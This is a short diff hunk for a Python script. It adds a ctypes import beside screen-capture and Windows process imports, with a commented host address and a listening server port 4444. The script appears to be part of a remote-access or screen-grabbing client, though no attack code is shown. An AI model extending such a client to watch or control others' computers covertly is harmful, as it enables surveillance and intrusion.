@@ -20,6 +20,7 @@ import signal
 from PIL import ImageGrab
 import win32gui
 import win32process
+import ctypes
 
 # HOST = '192.168.1.3'
 PORT = 4444 #Server Port is listening
